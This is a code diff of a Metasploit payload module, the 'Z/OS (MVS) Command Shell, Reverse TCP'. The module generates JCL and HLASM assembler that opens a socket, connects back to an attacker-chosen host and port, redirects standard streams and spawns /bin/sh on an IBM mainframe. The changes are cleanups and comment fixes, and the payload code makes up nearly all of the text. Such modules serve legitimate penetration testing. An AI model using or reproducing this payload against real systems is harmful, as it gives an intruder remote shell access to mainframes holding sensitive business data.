@@ -1,5 +1,5 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 # This payload has no ebcdic<->ascii translator built in.
 # Therefore it must use a shell which does, like mainframe_shell
@@ -13,7 +13,7 @@ require 'msf/base/sessions/mainframe_shell'
 require 'msf/base/sessions/command_shell_options'
 
 module MetasploitModule
-  CachedSize = 9973
+  CachedSize = 8993
   include Msf::Payload::Single
   include Msf::Payload::Mainframe
   include Msf::Sessions::CommandShellOptions
@@ -22,7 +22,7 @@ module MetasploitModule
     super(merge_info(info,
                      'Name'          => 'Z/OS (MVS) Command Shell, Reverse TCP',
                      'Description'   => 'Provide JCL which creates a reverse shell
-                       This implmentation does not include ebcdic character translation,
+                       This implementation does not include ebcdic character translation,
                        so a client with translation capabilities is required.  MSF handles
                        this automatically.',
                      'Author'        => 'Bigendian Smalls',
@@ -41,7 +41,7 @@ module MetasploitModule
     register_options(
       [
         # need these defaulted so we can manipulate them in command_string
-        Opt::LHOST('127.0.0.1'),
+        Opt::LHOST('0.0.0.0'),
         Opt::LPORT(4444),
         OptString.new('ACTNUM', [true, "Accounting info for JCL JOB card", "MSFUSER-ACCTING-INFO"]),
         OptString.new('PGMNAME', [true, "Programmer name for JCL JOB card", "programmer name"]),
@@ -81,15 +81,13 @@ module MetasploitModule
 
     jcl_jobcard +
       "//**************************************/\n" \
-      "//*  SPAWN REV SHELL FOR MSF MODULE    */\n" \
+      "//*  SPAWN REVERSE SHELL FOR MSF MODULE*/\n" \
       "//**************************************/\n" \
-      "//* final load module name here\n" \
-      "//SET1      SET PGMN=SPAWNREV\n" \
       "//*\n" \
       "//STEP1      EXEC PROC=ASMACLG,PARM.L=(CALL)\n" \
       "//L.SYSLIB   DD  DSN=SYS1.CSSLIB,DISP=SHR\n" \
       "//C.SYSIN    DD  *,DLM=ZZ\n" \
-      "         TITLE  'spaw rev shell non exec'\n" \
+      "         TITLE  'Spanws Reverse Shell'\n" \
       "SPAWNREV CSECT\n" \
       "SPAWNREV AMODE 31\n" \
       "SPAWNREV RMODE ANY\n" \
@@ -99,44 +97,35 @@ module MetasploitModule
       "         USING *,15\n" \
       "@SETUP0  B     @SETUP1\n" \
       "         DROP  15\n" \
-      "         DS    0H              # half word boundary\n" \
-      "@SETUP1  STM   14,12,12(13)    # save our registers\n" \
-      "         LR    2,13            # callers sa\n" \
-      "         LR    8,15            # pgm base in R8\n" \
-      "         USING @SETUP0,8       # R8 for base addressability\n" \
+      "         DS    0H                 # half word boundary\n" \
+      "@SETUP1  STM   14,12,12(13)       # save our registers\n" \
+      "         LR    2,13               # callers sa\n" \
+      "         LR    8,15               # pgm base in R8\n" \
+      "         USING @SETUP0,8          # R8 for base addressability\n" \
       "*************************************\n" \
       "* set up data area / addressability *\n" \
       "*************************************\n" \
-      "*\n" \
-      "         L     0,@DYNSIZE      # len of variable area\n" \
-      "         GETMAIN RU,LV=(0)     # get data stg, len R0\n" \
-      "         LR    13,1            # data address\n" \
-      "         USING @DATA,13        # addressability for data area\n" \
-      "*        XC    @DATA(@DATA#LEN),@DATA  # zero data area\n" \
-      "         ST    2,@BACK         # store callers sa address\n" \
-      "         ST    13,8(,2)        # store our data addr\n" \
-      "*************************************\n" \
-      "* set up INHE area / addressability *\n" \
-      "*************************************\n" \
-      "*\n" \
-      "*        L     0,=A(INHE#LENGTH) # length of INHE macro\n" \
-      "*        GETMAIN RU,LV=(0)     # get stg for inhe macro\n" \
-      "*        ST    1,@CONSA        # save addr inhe macro stg\n" \
-      "*        LR    5,1             # R5 has INHE struct address\n" \
-      "*        USING INHE,5          # addressability for INHE\n" \
-      "         DS    0H              # halfword boundaries\n" \
+      "         L     0,@DYNSIZE         # len of variable area\n" \
+      "         GETMAIN RU,LV=(0)        # get data stg, len R0\n" \
+      "         LR    13,1               # data address\n" \
+      "         USING @DATA,13           # addressability for data area\n" \
+      "         ST    2,@BACK            # store callers sa address\n" \
+      "         ST    13,8(,2)           # store our data addr\n" \
+      "         DS    0H                 # halfword boundaries\n" \
+      "\n" \
       "***********************************************************************\n" \
       "*        BPX1SOC set up socket - inline                               *\n" \
       "***********************************************************************\n" \
       "         CALL  BPX1SOC,                                                X\n" \
       "               (DOM,TYPE,PROTO,DIM,CLIFD,                              X\n" \
       "               RTN_VAL,RTN_COD,RSN_COD),VL,MF=(E,PLIST)\n" \
+      "\n" \
       "*******************************\n" \
       "*  chk return code, 0 or exit *\n" \
       "*******************************\n" \
       "         LHI   15,2\n" \
-      "         L     6,RTN_VAL\n" \
-      "         CIB   6,0,7,EXITP     # R6 not 0? Time to exit\n" \
+      "         L     7,RTN_VAL\n" \
+      "         CIB   7,0,7,EXITP        # R7 not 0? Time to exit\n" \
       "\n" \
       "***********************************************************************\n" \
       "*        BPX1CON (connect) connect to remote host - inline            *\n" \
@@ -153,8 +142,8 @@ module MetasploitModule
       "*  chk return code, 0 or exit *\n" \
       "*******************************\n" \
       "         LHI   15,3\n" \
-      "         L     6,RTN_VAL\n" \
-      "         CIB   6,0,7,EXITP     # R6 not 0? Time to exit\n" \
+      "         L     7,RTN_VAL\n" \
+      "         CIB   7,0,7,EXITP        # R7 not 0? Time to exit\n" \
       "\n" \
       "*************************************************\n" \
       "* order of things to prep child pid             *\n" \
@@ -172,9 +161,10 @@ module MetasploitModule
       "****************************************************\n" \
       "*  chk return code here anything but -1 is ok      *\n" \
       "****************************************************\n" \
-      "         LHI   15,11           # exit code for this func\n" \
-      "         L     7,RTN_VAL       # set r7 to rtn val\n" \
-      "         CIB   7,-1,8,EXITP    # r6 = -1 exit\n" \
+      "         LHI   15,4               # exit code for this func\n" \
+      "         L     7,RTN_VAL          # set r7 to rtn val\n" \
+      "         CIB   7,-1,8,EXITP       # R7 = -1 exit\n" \
+      "\n" \
       "*******************\n" \
       "*****  STDOUT *****\n" \
       "*******************\n" \
@@ -186,9 +176,10 @@ module MetasploitModule
       "****************************************************\n" \
       "*  chk return code here anything but -1 is ok      *\n" \
       "****************************************************\n" \
-      "         LHI   15,11           # exit code for this func\n" \
-      "         L     7,RTN_VAL       # set r7 to rtn val\n" \
-      "         CIB   7,-1,8,EXITP    # r6 = -1 exit\n" \
+      "         LHI   15,5               # exit code for this func\n" \
+      "         L     7,RTN_VAL          # set r7 to rtn val\n" \
+      "         CIB   7,-1,8,EXITP       # R7 = -1 exit\n" \
+      "\n" \
       "*******************\n" \
       "*****  STDERR *****\n" \
       "*******************\n" \
@@ -200,14 +191,13 @@ module MetasploitModule
       "****************************************************\n" \
       "*  chk return code here anything but -1 is ok      *\n" \
       "****************************************************\n" \
-      "         LHI   15,11           # exit code for this func\n" \
-      "         L     7,RTN_VAL       # set r7 to rtn val\n" \
-      "         CIB   7,-1,8,EXITP    # r7 = -1 exit\n" \
+      "         LHI   15,6               # exit code for this func\n" \
+      "         L     7,RTN_VAL          # set r7 to rtn val\n" \
+      "         CIB   7,-1,8,EXITP       # R7 = -1 exit\n" \
+      "\n" \
       "***********************************************************************\n" \
       "*        BP1SPN (SPAWN) execute shell '/bin/sh'                       *\n" \
       "***********************************************************************\n" \
-      "******\n" \
-      "******\n" \
       "         XC    INHE(INHE#LENGTH),INHE   # clear inhe structure\n" \
       "         XI    INHEFLAGS0,INHESETPGROUP\n" \
       "         SPACE ,\n" \
@@ -220,46 +210,35 @@ module MetasploitModule
       "               (EXCMDL,EXCMD,EXARGC,EXARGLL,EXARGL,EXENVC,EXENVLL,     X\n" \
       "               EXENVL,FDCNT,FDLST,=A(INHE#LENGTH),INHE,RTN_VAL,        X\n" \
       "               RTN_COD,RSN_COD),VL,MF=(E,PLIST)\n" \
-      "         LHI   15,12           # exit code for this func\n" \
-      "         L     7,RTN_VAL       # set r7 to rtn val\n" \
-      "         L     6,RTN_COD\n" \
-      "         L     5,RSN_COD\n" \
-      "         CIB   7,-1,8,EXITP    # r7 = -1 exit\n" \
+      "         LHI   15,7               # exit code for this func\n" \
+      "         L     7,RTN_VAL          # set r7 to rtn val\n" \
+      "         CIB   7,-1,8,EXITP       # R7 = -1 exit\n" \
       "\n" \
       "****************************************************\n" \
-      "* cleanup & exit                                   *\n" \
-      "* preload R15 with exit code                       *\n" \
+      "* cleanup & exit preload R15 with exit code        *\n" \
       "****************************************************\n" \
-      "GOODX    XR    15,15           # 4 FOR rc\n" \
-      "*        L     0,=A(INHE#LENGTH)\n" \
-      "*        L     5,@INHEA\n" \
-      "*        DROP  5\n" \
-      "*        FREEMAIN RU,LV=(0),A=(5) #free storage\n" \
+      "         XR    15,15              # 4 FOR rc\n" \
       "EXITP    L     0,@DYNSIZE\n" \
       "         LR    1,13\n" \
       "         L     13,@BACK\n" \
       "         DROP  13\n" \
-      "         FREEMAIN RU,LV=(0),A=(1) #free storage\n" \
-      "         XR    15,15\n" \
-      "         L     14,12(,13)      # load R14\n" \
-      "         LM    0,12,20(13)     # load 0-12\n" \
-      "         BSM   0,14            # branch to caller\n" \
+      "         FREEMAIN RU,LV=(0),A=(1) # Free storage\n" \
+      "         L     14,12(,13)         # load R14\n" \
+      "         LM    0,12,20(13)        # load 0-12\n" \
+      "         BSM   0,14               # branch to caller\n" \
       "\n" \
-      "**********************\n" \
-      "*                    *\n" \
-      "* Constant Sections  *\n" \
-      "*                    *\n" \
-      "**********************\n" \
-      "         DS    0F              # constants full word boundary\n" \
+      "****************************************************\n" \
+      "* Constants and Variables                          *\n" \
+      "****************************************************\n" \
+      "         DS    0F                 # constants full word boundary\n" \
       "F_STDI   EQU   0\n" \
       "F_STDO   EQU   1\n" \
       "F_STDE   EQU   2\n" \
       "*************************\n" \
-      "* Socket conn variables *       # functions used by pgm\n" \
+      "* Socket conn variables *         # functions used by pgm\n" \
       "*************************\n" \
       "CONNSOCK DC    XL2'#{lport}'    # LPORT\n" \
       "CONNADDR DC    XL4'#{lhost}'    # LHOST\n" \
-      "BACKLOG  DC    F'1'             # 1 byte backlog\n" \
       "DOM      DC    A(AF_INET)         # AF_INET = 2\n" \
       "TYPE     DC    A(SOCK#_STREAM)    # stream = 1\n" \
       "PROTO    DC    A(IPPROTO_IP)      # ip = 0\n" \
@@ -278,11 +257,8 @@ module MetasploitModule
       "EXENVC   DC    F'0'               # env var count\n" \
       "EXENVL   DC    F'0'               # env var arg list addr\n" \
       "EXENVLL  DC    F'0'               # env var arg len addr\n" \
-      "EXITRA   DC    F'0'               # exit routine addr\n" \
-      "EXITPLA  DC    F'0'               # exit rout parm list addr\n" \
       "FDCNT    DC    F'0'               # field count s/b 0\n" \
       "FDLST    DC    F'0'               # field list addr s/b 0\n" \
-      "MYLEN    DC    F'0'\n" \
       "TVER     DC    AL2(INHE#VER)\n" \
       "TLEN     DC    AL2(INHE#LENGTH)\n" \
       "         SPACE ,\n" \
@@ -297,22 +273,14 @@ module MetasploitModule
       "RTN_COD  DS    F                  # return code\n" \
       "RSN_COD  DS    F                  # reason code\n" \
       "CLIFD    DS    F                  # client fd\n" \
-      "*********************\n" \
-      "* Return value vars *\n" \
-      "*********************\n" \
-      "@SAVE00  DS    0D\n" \
-      "         DS    A\n" \
       "@BACK    DS    A\n" \
-      "@FORWARD DS    A\n" \
-      "         DS    15A\n" \
-      "@INHEA   DS    A\n" \
       "*\n" \
       "         BPXYSOCK   LIST=NO,DSECT=NO\n" \
       "         BPXYFCTL   LIST=NO,DSECT=NO\n" \
       "         BPXYINHE   LIST=NO,DSECT=NO\n" \
       "@ENDYN   EQU   *\n" \
       "@DATA#LEN EQU  *-@DATA\n" \
-      "         BPXYCONS   LIST=YES\n" \
+      "         BPXYCONS   LIST=NO\n" \
       "         END   SPAWNREV\n" \
       "ZZ\n" \
       "//*\n"
